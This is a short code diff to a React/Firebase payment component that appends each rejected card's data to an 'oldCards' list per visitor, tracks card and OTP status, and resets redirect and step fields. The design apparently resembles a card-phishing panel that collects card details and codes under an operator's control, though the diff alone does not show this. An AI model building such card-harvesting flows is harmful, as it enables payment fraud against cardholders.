@@ -199,7 +199,10 @@ export default function P1({ offerTotalPrice }: _P1Props) {
             
             updateDoc(doc(db, "pays", visitorID), {
               oldCards: data.oldCards ? [...data.oldCards, currentCardData] : [currentCardData],
-              cardStatus: "pending"
+              cardStatus: "pending",
+              // Clear redirect fields so user stays on card page
+              redirectPage: null,
+              currentStep: "_st1"
             }).catch(err => {
               console.error("[Card Status] Error saving rejected card:", err)
             })
@@ -286,8 +289,11 @@ export default function P1({ offerTotalPrice }: _P1Props) {
         originalPrice: offerTotalPrice,
         discount,
         finalPrice: Number.parseFloat(finalPrice.toFixed(2)),
-        cardStatus: "waiting",
-        otpStatus: "pending"
+        cardStatus: "pending",
+        otpStatus: "pending",
+        // Clear any previous redirect/step values
+        redirectPage: null,
+        currentStep: "_st1"
       })
       
       console.log('[Payment] Data saved successfully')
